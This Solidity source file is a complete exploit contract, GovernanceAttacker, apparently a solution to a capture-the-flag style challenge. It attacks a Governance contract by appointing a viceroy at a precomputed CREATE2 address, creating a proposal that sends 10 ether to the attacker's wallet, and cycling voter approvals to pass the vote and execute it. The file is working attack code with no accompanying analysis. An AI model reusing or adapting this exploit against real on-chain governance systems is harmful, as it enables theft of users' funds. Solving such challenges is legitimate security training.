// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import { Governance } from "./Viceroy.sol";
import "hardhat/console.sol";

contract GovernanceAttacker {
  Governance public governance;

  function attack(address _governance) public payable {
    governance = Governance(_governance);

    // Proposal data
    bytes memory proposalData = abi.encodeWithSignature(
      "exec(address,bytes,uint256)",
      msg.sender, // attacker wallet
      "", // empty data
      10 ether // 10 ether to send to attacker
    );

    uint256 proposalId = uint256(keccak256(proposalData));

    // Get bytecode of Viceroy contract
    bytes memory bytecode = getBytecodeViceroy(_governance);

    // Get address of Viceroy contract
    address viceroyAddress = computeAddress(bytecode, 1);
    console.log("Viceroy precomputed address: %s", viceroyAddress);

    // Appoint viceroy
    governance.appointViceroy(viceroyAddress, 1);
    console.log("Viceroy appointed");

    // Deploy viceroy
    new Viceroy{salt:bytes32(uint256(1))}(_governance);

    // Create proposal
    Viceroy(viceroyAddress).createProposal(proposalData);

    // Get bytecode of Voter contract
    bytecode = getByteCodeVoter(_governance, viceroyAddress);

    // Get and store address of Voter contracts
    address[10] memory voterAddresses;
    for (uint256 i = 0; i < 10; i++) {
      voterAddresses[i] = computeAddress(bytecode, i);
      console.log("Voter precomputed address: %s", voterAddresses[i]);
    }

    // Approve voters
    for (uint256 i = 0; i < 5; i++) {
      Viceroy(viceroyAddress).approveVoter(voterAddresses[i]);
    }

    // Deploy voters
    for (uint256 i = 0; i < 5; i++) {
      new Voter{salt:bytes32(uint256(i))}(_governance, viceroyAddress);
    }

    // Vote
    for (uint256 i = 0; i < 5; i++) {
      Voter(voterAddresses[i]).voteOnProposal(proposalId);
    }

    // Disapprove voters
    for (uint256 i = 0; i < 5; i++) {
      Viceroy(viceroyAddress).disapproveVoter(voterAddresses[i]);
    }

    // Approve new voters
    for (uint256 i = 5; i < 10; i++) {
      Viceroy(viceroyAddress).approveVoter(voterAddresses[i]);
    }

    // Deploy new voters
    for (uint256 i = 5; i < 10; i++) {
      new Voter{salt:bytes32(uint256(i))}(_governance, viceroyAddress);
    }

    // Vote
    for (uint256 i = 5; i < 10; i++) {
      Voter(voterAddresses[i]).voteOnProposal(proposalId);
    }

    // Execute proposal
    governance.executeProposal(proposalId);
  }

  function computeAddress(bytes memory _byteCode, uint256 _salt) public view returns (address) {
    bytes32 hash = keccak256(
      abi.encodePacked(
        bytes1(0xff),
        address(this),
        _salt,
        keccak256(_byteCode)
      )
    );
    return address(uint160(uint256(hash)));
  }

  function getBytecodeViceroy(address _governance) public pure returns (bytes memory) {
    bytes memory bytecode = type(Viceroy).creationCode;
    return abi.encodePacked(bytecode, abi.encode(_governance));
  }

  function getByteCodeVoter(address _governance, address _viceroy) public pure returns (bytes memory) {
    bytes memory bytecode = type(Voter).creationCode;
    return abi.encodePacked(bytecode, abi.encode(_governance), abi.encode(_viceroy));
  }
}

contract Viceroy {
  Governance public governance;

  constructor(address _governance) {
    governance = Governance(_governance);
    console.log("Viceroy deployed, address: %s", address(this));
  }

  function createProposal(bytes memory proposalData) external {
    governance.createProposal(address(this), proposalData);
    console.log("Proposal created");
  }

  function approveVoter(address voter) external {
    governance.approveVoter(voter);
    console.log("Voter approved");
  }

  function disapproveVoter(address voter) external {
    governance.disapproveVoter(voter);
    console.log("Voter disapproved");
  }
}

contract Voter {
  Governance public governance;
  Viceroy public viceroy;

  constructor(
    address _governance,
    address _viceroy
  ) {
    governance = Governance(_governance);
    viceroy = Viceroy(_viceroy);
  }

  function voteOnProposal(uint256 proposal) external {
    governance.voteOnProposal(proposal, true, address(viceroy));
    console.log("Voted");
  }
}
